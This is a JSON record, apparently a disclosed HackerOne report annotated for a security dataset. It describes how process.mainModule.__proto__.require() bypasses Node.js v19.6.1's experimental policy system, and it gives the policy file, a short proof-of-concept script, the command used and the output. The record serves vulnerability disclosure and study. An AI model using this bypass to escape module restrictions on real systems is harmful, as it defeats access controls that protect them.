{
  "reported_to": "Node.js",
  "reported_by": "haxatron1 ",
  "title": "The use of __proto__ in process.mainModule.__proto__.require() bypasses the permission system in Node v19.6.1",
  "content": "\nprocess.mainModule.require() correctly works with permission system in Node v19.6.1.\nBut the use of __proto__ in process.mainModule.__proto__.require() can bypass the check.\nDescription and STR\nConsider the following policy.json:\nCode 73 Bytes\n1{\n2  \"resources\": {\n3    \"./proc.js\": {\n4      \"integrity\": true\n5    }\n6  }\n7}\nThe policy only allows proc.js file to be loaded without any dependencies.\nHowever with the following proc.js\nCode 109 Bytes\n1const os = process.mainModule.__proto__.require(\"os\")\n2\n3console.log(process.version)\n4console.log(os.version())\nWe get the output:\nCode 270 Bytes\n1\u2514\u2500$ ../node-v19.6.1-linux-x64/bin/node --experimental-policy=policy.json proc.js\n2v19.6.1\n3#1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)\n4(node:2720) ExperimentalWarning: Policies are experimental.\n5(Use `node --trace-warnings ...` to show where the warning was created)\nTherefore os dependency can be loaded and os.version executed even if unspecified in permission system.\nImpact\nBypass the permission system\n\n",
  "severity": [
    8.4,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Privilege Escalation"
  ],
  "screenshots": {},
  "disclosed_date": 1689900900,
  "report_url": "https://hackerone.com/reports/1877919",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a policy.json file with restricted access to only './proc.js' with integrity checks enabled."
    ],
    [
      2,
      "Create a proc.js file that uses `process.mainModule.__proto__.require(\"os\")` to bypass the permission system."
    ],
    [
      3,
      "Run the Node.js application with the experimental policy flag: `node --experimental-policy=policy.json proc.js`."
    ],
    [
      4,
      "Observe that the 'os' module is loaded and executed despite not being specified in the policy.json file."
    ]
  ],
  "vuln_description": "The vulnerability allows bypassing Node.js's permission system by using `__proto__` to access the `require` function through `process.mainModule.__proto__.require()`. This bypasses the integrity checks and allows loading and executing modules not specified in the policy file.",
  "reason": "The attack involves understanding Node.js's permission system and the prototype chain to manipulate the `require` function. While the components are straightforward, the use of `__proto__` to bypass checks is a subtle interaction that requires knowledge of JavaScript's prototype inheritance.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "idor_detectable": false,
    "authnz_byppass_detectable": true
  }
}